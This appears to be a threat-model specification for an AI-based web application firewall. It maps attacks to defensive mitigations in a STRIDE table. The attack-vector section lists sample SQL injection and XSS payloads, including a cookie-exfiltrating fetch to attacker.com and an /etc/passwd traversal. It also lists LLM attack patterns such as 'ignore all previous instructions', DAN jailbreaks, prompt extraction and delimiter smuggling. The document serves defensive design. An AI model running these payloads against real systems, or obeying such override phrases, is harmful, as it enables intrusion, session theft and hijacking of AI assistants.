# Threat Model & Attack Surface Specification (Phase 00)
**Project Title:** AI-Based Web Application Firewall for SQL Injection and XSS Detection  
**Methodology:** STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)

---

## 1. Threat Actors & Attacker Profiles

1. **Automated Vulnerability Scanners:** Tools such as `sqlmap`, `Nikto`, `OWASP ZAP`, and automated crawlers sending high-frequency structured probes.
2. **Script Kiddies / Opportunistic Attackers:** Users leveraging publicly available exploit payloads with minor tweaks and copy-pasted polyglots.
3. **Targeted Adversaries:** Skilled attackers attempting evasion techniques (multi-pass URL encoding, SQL inline comments `/**/`, mixed casing, Unicode homoglyphs, and delimiter manipulation).

---

## 2. Attack Vectors in Scope

### A. SQL Injection (SQLi)
- **Error-Based & Union-Based:** Injecting `' UNION SELECT ... --` to extract schema or credentials.
- **Tautology / Authentication Bypass:** Injecting `' OR 1=1 --` into username/password parameters.
- **Time-Based Blind SQLi:** Injecting database delay functions such as `waitfor delay '0:0:15';` or `pg_sleep(5)`.
- **Batched Execution:** Injecting stacked queries such as `'; DROP TABLE users; --`.

### B. Cross-Site Scripting (XSS)
- **Reflected Script Tags:** Injecting `<script>alert(1)</script>` into search queries or URL paths.
- **DOM & Event Handler Exploits:** Injecting payloads into attributes: `<img src=x onerror=alert('XSS')>` or `<svg onload=confirm(1)>`.
- **Protocol Handlers:** Injecting `javascript:fetch('//attacker.com?c='+document.cookie)`.

### C. Auxiliary Threats
- **Path Traversal / Forced Browsing:** Probing backup files (`.bak`, `.old`), configuration files, or traversal (`../../etc/passwd`).
- **CRLF Injection / Response Splitting:** Injected newlines `%0D%0A` attempting to set malicious session headers.

### D. Generative AI & LLM Interface Threats (OWASP LLM01)
- **Direct Instruction Overrides:** Prompts instructing upstream LLMs to ignore prior rules (`ignore all previous instructions`).
- **Jailbreak Signatures:** DAN (Do Anything Now), persona hijacking, and developer mode prompts.
- **System Prompt Exfiltration:** Attempts to extract confidential system instructions and secret guardrails.
- **Delimiter Smuggling:** Injection of `<|im_start|>system` and `[INST]` boundary tokens.
- **Obfuscated Prompts:** Base64-encoded instructions hiding malicious prompts from standard inspection.

### E. Evasive Syntactic Mutations
- **SQL Inline Splicing:** Keyword interruption via comments (`UNION/**/SELECT`).
- **Tautology Polymorphism:** Substitution of classic `1=1` with expressions like `'a'='a'`, `2>1`.
- **Adversarial Perturbations:** Multi-operator automated mutations (tested via adversarial fuzzer).

---

## 3. STRIDE Threat Analysis Matrix for the WAF System

| Threat Category | Potential Attack on the System | WAF Mitigation & Design Safeguard |
| :--- | :--- | :--- |
| **Spoofing** | Attacker spoofs client IP via manipulated `X-Forwarded-For` headers. | Nginx config explicitly strips or sanitizes untrusted forwarded headers; tracks direct socket IP. |
| **Tampering** | Attacker obfuscates SQLi/XSS payloads using double URL encoding or comment blocks to bypass regex. | Multi-pass recursive URL normalizer + Grammar-aware AST Lexer (`src/ast_parser.py`) decodes and tokenizes inputs. |
| **Repudiation** | Attacker denies malicious activity; logs manipulated or truncated. | Immutable, append-only SQLite/PostgreSQL audit logging with UTC timestamps, unique request UUIDs, and Active Learning store (`backend/active_learning.db`). |
| **Information Disclosure** | Attack response or error stack reveals backend database or internal server paths. | WAF returns standardized generic HTTP 403 Forbidden screens; masks sensitive parameters from logs. |
| **Denial of Service** | Attacker sends massive payloads (>10MB) or regex ReDoS strings to hang the WAF. | Nginx enforces `client_max_body_size 2M`; timeouts set on subrequests; ONNX Runtime engine (`src/onnx_engine.py`) accelerates throughput to 606.7 req/s. |
| **Elevation of Privilege** | Attacker bypasses WAF by directly accessing target web application on internal ports or hijacking upstream LLM. | Docker bridge network isolation (zero target ports mapped) + LLM Prompt Shield (`src/llm_guard.py` & `POST /scan_llm`). |
